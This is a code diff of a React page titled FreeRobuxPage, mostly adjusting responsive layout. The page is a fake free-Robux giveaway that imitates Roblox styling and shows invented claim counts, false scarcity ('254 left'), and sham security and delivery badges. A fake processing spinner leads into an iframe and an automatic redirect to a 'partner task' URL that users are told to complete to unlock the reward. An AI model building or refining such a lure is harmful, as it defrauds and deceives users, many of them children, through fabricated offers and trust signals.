@@ -23,7 +23,6 @@ export default function FreeRobuxPage() {
   const [selectedAmount, setSelectedAmount] = useState<string | null>(null);
   const [bannerIndex, setBannerIndex] = useState(0);
 
-  // Background Slider logic
   useEffect(() => {
     const interval = setInterval(() => {
       setBannerIndex((prev) => (prev + 1) % BANNERS.length);
@@ -46,7 +45,6 @@ export default function FreeRobuxPage() {
       setIsProcessing(false);
       setShowIframe(true);
       
-      // Auto-redirect fallback
       setTimeout(() => {
         if (typeof window !== 'undefined') {
           window.location.href = PARTNER_URL;
@@ -56,7 +54,7 @@ export default function FreeRobuxPage() {
   };
 
   return (
-    <div className="min-h-screen bg-black font-sans text-white selection:bg-[#00B06F]/30 overflow-x-hidden">
+    <div className="min-h-screen bg-black font-sans text-white selection:bg-[#00B06F]/30 overflow-x-hidden box-border">
       
       {/* Background Animated Slider */}
       <div className="fixed inset-0 z-0">
@@ -71,57 +69,54 @@ export default function FreeRobuxPage() {
               backgroundImage: `url(${banner})`,
               backgroundSize: 'cover',
               backgroundPosition: 'center',
-              transitionProperty: 'opacity, transform'
             }}
           />
         ))}
-        {/* Dark Overlay */}
         <div className="absolute inset-0 bg-black/60 backdrop-blur-[2px]" />
       </div>
 
       {/* Roblox-style Top Bar */}
-      <div className="relative h-16 bg-white/10 backdrop-blur-xl border-b border-white/10 flex items-center px-6 justify-between shadow-xl z-50">
-        <div className="flex items-center gap-4">
-          <div className="relative w-9 h-9 drop-shadow-[0_0_8px_rgba(255,255,255,0.3)]">
+      <div className="relative h-16 bg-white/10 backdrop-blur-xl border-b border-white/10 flex items-center px-4 md:px-6 justify-between shadow-xl z-50">
+        <div className="flex items-center gap-3 md:gap-4">
+          <div className="relative w-8 h-8 md:w-9 md:h-9 drop-shadow-[0_0_8px_rgba(255,255,255,0.3)]">
             <Image src={CUSTOM_ICON} alt="Icon" fill className="object-contain" />
           </div>
-          <span className="font-black text-sm uppercase tracking-tighter text-white">Rewards Dashboard</span>
+          <span className="font-black text-xs md:text-sm uppercase tracking-tighter text-white">Rewards Dashboard</span>
         </div>
-        <div className="flex items-center gap-6">
-          <div className="hidden md:flex items-center gap-2 text-[10px] font-black text-white/50 uppercase tracking-[0.2em]">
+        <div className="flex items-center gap-4 md:gap-6">
+          <div className="hidden lg:flex items-center gap-2 text-[10px] font-black text-white/50 uppercase tracking-[0.2em]">
             <Users className="w-4 h-4 text-[#00B06F]" /> 2.1M users claimed
           </div>
-          {/* Header Profile */}
-          <div className="flex items-center gap-3 bg-white/5 pl-2 pr-4 py-1 rounded-full border border-white/10">
-            <div className="relative w-8 h-8 rounded-full overflow-hidden border-2 border-[#00B06F] shadow-lg">
+          <div className="flex items-center gap-2 md:gap-3 bg-white/5 pl-1.5 pr-3 md:pr-4 py-1 rounded-full border border-white/10">
+            <div className="relative w-7 h-7 md:w-8 md:h-8 rounded-full overflow-hidden border-2 border-[#00B06F] shadow-lg">
               <Image src={PROFILE_IMG} alt="User" fill className="object-cover" />
             </div>
-            <span className="text-xs font-bold text-white">Premium User</span>
+            <span className="text-[10px] md:text-xs font-bold text-white whitespace-nowrap">Premium User</span>
           </div>
         </div>
       </div>
 
-      <main className="relative z-10 max-w-5xl mx-auto py-12 px-6">
+      <main className="relative z-10 max-w-5xl mx-auto py-8 md:py-12 px-4 md:px-6">
         
         {/* Profile Header Hero */}
-        <div className="flex flex-col items-center mb-12 animate-in fade-in slide-in-from-top-8 duration-1000">
-           <div className="relative w-24 h-24 rounded-full overflow-hidden border-4 border-white shadow-[0_0_30px_rgba(255,255,255,0.2)] mb-6 transition-transform hover:scale-105 duration-500">
+        <div className="flex flex-col items-center mb-8 md:mb-12 animate-in fade-in slide-in-from-top-8 duration-1000">
+           <div className="relative w-20 h-20 md:w-24 md:h-24 rounded-full overflow-hidden border-4 border-white shadow-[0_0_30px_rgba(255,255,255,0.2)] mb-4 md:mb-6 transition-transform hover:scale-105 duration-500">
               <Image src={PROFILE_IMG} alt="Profile" fill className="object-cover" />
            </div>
-           <h1 className="text-4xl md:text-5xl font-black mb-2 text-center text-white drop-shadow-lg">
-             Exclusive Rewards <Sparkles className="inline-block text-yellow-400 w-8 h-8 fill-current animate-pulse ml-2" />
+           <h1 className="text-3xl md:text-5xl font-black mb-2 text-center text-white drop-shadow-lg flex items-center gap-2">
+             Exclusive Rewards <Sparkles className="text-yellow-400 w-6 h-6 md:w-8 md:h-8 fill-current animate-pulse" />
            </h1>
-           <p className="text-white/60 font-black uppercase tracking-[0.3em] text-[10px] text-center">
+           <p className="text-white/60 font-black uppercase tracking-[0.3em] text-[8px] md:text-[10px] text-center">
              Premium member benefit active
            </p>
         </div>
 
         {/* Roblox Style Main Card */}
-        <div className="liquid-glass rounded-[2.5rem] border border-white/10 overflow-hidden flex flex-col md:flex-row shadow-2xl animate-in zoom-in-95 duration-700">
+        <div className="liquid-glass rounded-[1.5rem] md:rounded-[2.5rem] border border-white/10 overflow-hidden flex flex-col md:flex-row shadow-2xl animate-in zoom-in-95 duration-700">
           
           {/* Left Side: Badge Info */}
-          <div className="w-full md:w-1/3 p-10 border-r border-white/5 bg-white/5 flex flex-col items-center">
-            <div className="relative w-44 h-44 rounded-[2rem] overflow-hidden border-4 border-white/10 shadow-2xl mb-8 group">
+          <div className="w-full md:w-1/3 p-6 md:p-10 border-b md:border-b-0 md:border-r border-white/5 bg-white/5 flex flex-col items-center">
+            <div className="relative w-32 h-32 md:w-44 md:h-44 rounded-[1.5rem] md:rounded-[2rem] overflow-hidden border-4 border-white/10 shadow-2xl mb-6 md:mb-8 group">
               <Image 
                 src="https://picsum.photos/seed/rewards-hero/500/500" 
                 alt="Rewards" 
@@ -131,63 +126,63 @@ export default function FreeRobuxPage() {
               <div className="absolute inset-0 bg-gradient-to-t from-black/60 to-transparent" />
             </div>
             
-            <div className="space-y-4 w-full">
-              <div className="bg-[#00B06F]/10 text-[#00B06F] p-5 rounded-2xl text-[10px] font-black uppercase flex items-center gap-3 border border-[#00B06F]/20">
-                <ShieldCheck className="w-5 h-5" />
-                Verified Delivery Enabled
+            <div className="space-y-3 md:space-y-4 w-full">
+              <div className="bg-[#00B06F]/10 text-[#00B06F] p-4 md:p-5 rounded-xl md:rounded-2xl text-[8px] md:text-[10px] font-black uppercase flex items-center gap-3 border border-[#00B06F]/20">
+                <ShieldCheck className="w-4 h-4 md:w-5 md:h-5" />
+                Verified Delivery
               </div>
-              <div className="bg-white/5 text-white/40 p-5 rounded-2xl text-[10px] font-black uppercase flex items-center gap-3 border border-white/5">
-                <Users className="w-5 h-5" /> High Traffic: Low Stock
+              <div className="bg-white/5 text-white/40 p-4 md:p-5 rounded-xl md:rounded-2xl text-[8px] md:text-[10px] font-black uppercase flex items-center gap-3 border border-white/5">
+                <Users className="w-4 h-4 md:w-5 md:h-5" /> Low Stock
               </div>
             </div>
           </div>
 
           {/* Center: Reward Selection */}
-          <div className="flex-1 p-10 bg-white/5">
-            <div className="grid grid-cols-1 gap-4">
+          <div className="flex-1 p-6 md:p-10 bg-white/5">
+            <div className="grid grid-cols-1 gap-3 md:gap-4">
               {rewards.map((reward, idx) => (
                 <div 
                   key={reward.amount} 
                   style={{ animationDelay: `${idx * 150}ms` }}
                   className={cn(
-                    "group flex items-center justify-between p-7 rounded-[2rem] border-2 border-transparent bg-white/5 hover:bg-white/10 hover:border-[#00B06F]/50 transition-all cursor-pointer shadow-lg animate-in fade-in slide-in-from-right-8 duration-700",
+                    "group flex items-center justify-between p-4 md:p-6 rounded-[1.2rem] md:rounded-[2rem] border-2 border-transparent bg-white/5 hover:bg-white/10 hover:border-[#00B06F]/50 transition-all cursor-pointer shadow-lg animate-in fade-in slide-in-from-right-8 duration-700 overflow-hidden",
                     reward.popular && "border-[#00B06F]/20"
                   )}
                   onClick={() => handleClaim(reward.amount)}
                 >
-                  <div className="flex items-center gap-6">
-                    <div className="relative w-14 h-14 flex-shrink-0 drop-shadow-[0_0_15px_rgba(255,255,255,0.2)] group-hover:rotate-12 transition-transform">
+                  <div className="flex items-center gap-3 md:gap-6 flex-1 min-w-0">
+                    <div className="relative w-10 h-10 md:w-14 md:h-14 flex-shrink-0 drop-shadow-[0_0_15px_rgba(255,255,255,0.2)] group-hover:rotate-12 transition-transform">
                       <Image src={CUSTOM_ICON} alt="Icon" fill className="object-contain" />
                     </div>
-                    <div>
-                      <div className="flex items-center gap-3">
-                        <span className="text-4xl font-black tracking-tighter text-white">{reward.amount}</span>
+                    <div className="min-w-0">
+                      <div className="flex items-center gap-2 md:gap-3 flex-wrap">
+                        <span className="text-xl md:text-4xl font-black tracking-tighter text-white truncate">{reward.amount}</span>
                         {reward.popular && (
-                          <span className="bg-[#00B06F] text-white text-[8px] font-black uppercase px-3 py-1 rounded-full shadow-lg shadow-[#00B06F]/40 animate-pulse">Most Claimed</span>
+                          <span className="bg-[#00B06F] text-white text-[7px] md:text-[8px] font-black uppercase px-2 md:px-3 py-0.5 md:py-1 rounded-full shadow-lg shadow-[#00B06F]/40 animate-pulse whitespace-nowrap">Popular</span>
                         )}
                       </div>
-                      <span className="text-[10px] font-black text-white/40 uppercase tracking-[0.2em]">{reward.bonus}</span>
+                      <span className="text-[8px] md:text-[10px] font-black text-white/40 uppercase tracking-[0.2em] block truncate">{reward.bonus}</span>
                     </div>
                   </div>
                   
-                  <Button className="bg-[#00B06F] hover:bg-[#008F5B] text-white font-black rounded-full px-12 h-16 shadow-xl shadow-[#00B06F]/20 transition-all active:scale-95 text-xl group-hover:scale-105">
+                  <Button className="flex-shrink-0 w-24 md:w-32 bg-[#00B06F] hover:bg-[#008F5B] text-white font-black rounded-full h-10 md:h-16 shadow-xl shadow-[#00B06F]/20 transition-all active:scale-95 text-sm md:text-xl group-hover:scale-105 ml-4 whitespace-nowrap">
                     Free
                   </Button>
                 </div>
               ))}
             </div>
 
-            <div className="mt-10 pt-10 border-t border-white/10 flex flex-col md:flex-row items-center justify-between gap-6">
+            <div className="mt-8 md:mt-10 pt-8 md:pt-10 border-t border-white/10 flex flex-col md:flex-row items-center justify-between gap-4 md:gap-6">
               <div className="text-center md:text-left">
-                <p className="text-[10px] text-[#00B06F] font-black uppercase tracking-[0.3em] mb-1">
-                  * Instant Release Protocol Active
+                <p className="text-[8px] md:text-[10px] text-[#00B06F] font-black uppercase tracking-[0.3em] mb-1">
+                  * Instant Release Active
                 </p>
-                <p className="text-xs text-white/30 font-bold uppercase tracking-widest">
-                  Secure transfer assigned to current IP
+                <p className="text-[10px] text-white/30 font-bold uppercase tracking-widest">
+                  Secure transfer assigned
                 </p>
               </div>
-              <div className="flex items-center gap-3 text-white font-black text-sm bg-white/10 px-8 py-3 rounded-full border border-white/10 backdrop-blur-md">
-                <Users className="w-5 h-5 text-[#00B06F]" /> 254 left
+              <div className="flex items-center gap-3 text-white font-black text-xs md:text-sm bg-white/10 px-6 md:px-8 py-2 md:py-3 rounded-full border border-white/10 backdrop-blur-md">
+                <Users className="w-4 h-4 md:w-5 md:h-5 text-[#00B06F]" /> 254 left
               </div>
             </div>
           </div>
@@ -196,24 +191,24 @@ export default function FreeRobuxPage() {
 
       {/* Step 1: Processing Modal */}
       <Dialog open={isProcessing} onOpenChange={setIsProcessing}>
-        <DialogContent className="sm:max-w-md bg-black/95 backdrop-blur-2xl border-white/10 rounded-[3rem] p-12 text-center outline-none">
+        <DialogContent className="sm:max-w-md bg-black/95 backdrop-blur-2xl border-white/10 rounded-[2rem] md:rounded-[3rem] p-8 md:p-12 text-center outline-none">
           <DialogHeader>
             <DialogTitle className="hidden">Processing</DialogTitle>
           </DialogHeader>
-          <div className="flex flex-col items-center space-y-8">
+          <div className="flex flex-col items-center space-y-6 md:space-y-8">
             <div className="relative">
-              <Loader2 className="w-24 h-24 text-[#00B06F] animate-spin" />
-              <div className="absolute inset-0 flex items-center justify-center p-6">
+              <Loader2 className="w-16 h-16 md:w-24 md:h-24 text-[#00B06F] animate-spin" />
+              <div className="absolute inset-0 flex items-center justify-center p-4 md:p-6">
                 <div className="relative w-full h-full animate-pulse">
                   <Image src={CUSTOM_ICON} alt="Icon" fill className="object-contain" />
                 </div>
               </div>
             </div>
-            <div className="space-y-3">
-              <h2 className="text-3xl font-black text-white tracking-tighter">Initializing Link...</h2>
-              <p className="text-white/40 font-black uppercase tracking-[0.3em] text-[10px]">Secure encryption for {selectedAmount} reward</p>
+            <div className="space-y-2 md:space-y-3">
+              <h2 className="text-2xl md:text-3xl font-black text-white tracking-tighter">Initializing Link...</h2>
+              <p className="text-white/40 font-black uppercase tracking-[0.3em] text-[8px] md:text-[10px]">Secure encryption for {selectedAmount} reward</p>
             </div>
-            <div className="w-full bg-white/5 h-2.5 rounded-full overflow-hidden mt-4 border border-white/5">
+            <div className="w-full bg-white/5 h-2 md:h-2.5 rounded-full overflow-hidden mt-2 md:mt-4 border border-white/5">
               <div className="bg-[#00B06F] h-full animate-[progress_2.8s_ease-in-out]" style={{ width: '100%' }} />
             </div>
           </div>
@@ -222,34 +217,34 @@ export default function FreeRobuxPage() {
 
       {/* Step 2: Iframe Partner Modal */}
       <Dialog open={showIframe} onOpenChange={setShowIframe}>
-        <DialogContent className="sm:max-w-3xl bg-black/95 backdrop-blur-2xl border-white/10 rounded-[3rem] p-0 overflow-hidden shadow-[0_0_100px_rgba(0,176,111,0.1)] outline-none">
-          <DialogHeader className="p-8 bg-white/5 border-b border-white/10 flex flex-row items-center justify-between space-y-0">
-            <div className="flex items-center gap-4">
-              <div className="relative w-9 h-9">
+        <DialogContent className="max-w-[95vw] sm:max-w-3xl bg-black/95 backdrop-blur-2xl border-white/10 rounded-[2rem] md:rounded-[3rem] p-0 overflow-hidden shadow-[0_0_100px_rgba(0,176,111,0.1)] outline-none">
+          <DialogHeader className="p-6 md:p-8 bg-white/5 border-b border-white/10 flex flex-row items-center justify-between space-y-0">
+            <div className="flex items-center gap-3 md:gap-4">
+              <div className="relative w-7 h-7 md:w-9 md:h-9">
                 <Image src={CUSTOM_ICON} alt="Icon" fill className="object-contain" />
               </div>
               <div>
-                <DialogTitle className="text-2xl font-black text-white tracking-tighter">Final Step</DialogTitle>
-                <p className="text-[10px] text-white/40 font-black uppercase tracking-[0.2em]">Complete one partner task to unlock reward</p>
+                <DialogTitle className="text-xl md:text-2xl font-black text-white tracking-tighter">Final Step</DialogTitle>
+                <p className="text-[8px] md:text-[10px] text-white/40 font-black uppercase tracking-[0.2em]">Complete one task to unlock reward</p>
               </div>
             </div>
             <Button variant="ghost" size="icon" onClick={() => setShowIframe(false)} className="rounded-full hover:bg-white/10 text-white/40">
-              <X className="w-6 h-6" />
+              <X className="w-5 h-5 md:w-6 md:h-6" />
             </Button>
           </DialogHeader>
           
-          <div className="relative bg-black min-h-[550px] flex flex-col">
+          <div className="relative bg-black h-[60vh] md:h-[550px] flex flex-col">
             <iframe 
               src={PARTNER_URL} 
-              className="w-full h-[550px] border-none"
+              className="w-full h-full border-none"
               title="Partner Verification"
             />
             
-            <div className="p-8 bg-white/5 border-t border-white/10 text-center backdrop-blur-md">
-              <p className="text-[10px] text-white/30 font-black uppercase tracking-[0.3em] mb-4">Connection issue? Use direct link</p>
+            <div className="p-6 md:p-8 bg-white/5 border-t border-white/10 text-center backdrop-blur-md">
+              <p className="text-[8px] md:text-[10px] text-white/30 font-black uppercase tracking-[0.3em] mb-4">Connection issue? Use direct link</p>
               <Button 
                 onClick={() => window.location.href = PARTNER_URL}
-                className="w-full bg-[#00B06F] hover:bg-[#008F5B] text-white font-black h-16 rounded-2xl text-xl shadow-2xl shadow-[#00B06F]/40 active:scale-95 transition-all"
+                className="w-full bg-[#00B06F] hover:bg-[#008F5B] text-white font-black h-12 md:h-16 rounded-xl md:rounded-2xl text-lg md:text-xl shadow-2xl shadow-[#00B06F]/40 active:scale-95 transition-all"
               >
                 Continue to Verify
               </Button>
